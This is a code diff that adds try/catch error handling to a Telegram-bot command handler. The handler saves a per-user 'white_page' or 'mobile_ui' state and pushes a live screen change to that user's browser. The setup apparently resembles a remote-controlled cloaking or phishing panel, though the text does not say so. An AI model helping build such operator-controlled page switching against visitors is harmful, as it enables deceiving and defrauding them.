@@ -209,22 +209,35 @@ Available Commands:
             const state = isWhite ? 'white_page' : 'mobile_ui';
             const user = action.replace('set_white_', '').replace('set_mobile_', '');
 
-            // 1. Save state so it automatically applies next time
-            await redis.hset('user_states', { [user]: state });
+            try {
+                // 1. Save state so it automatically applies next time
+                await redis.hset('user_states', { [user]: state });
 
-            // 2. Send live trigger to active browsers
-            await pusher.trigger(`user-${user}`, 'screen-change', { state: state });
+                // 2. Send live trigger to active browsers
+                await pusher.trigger(`user-${user}`, 'screen-change', { state: state });
 
-            // 3. Notify admin
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `✅ *${state.toUpperCase()}* set and saved for \`${user}\``,
-                    parse_mode: 'Markdown'
-                })
-            });
+                // 3. Notify admin
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `✅ *${state.toUpperCase()}* set and saved for \`${user}\``,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) {
+                // Notify admin about the error so it doesn't fail silently
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `❌ *ERROR SETTING STATE:*\n\`${err.message}\``,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            }
         }
         return res.status(200).send('OK');
     }
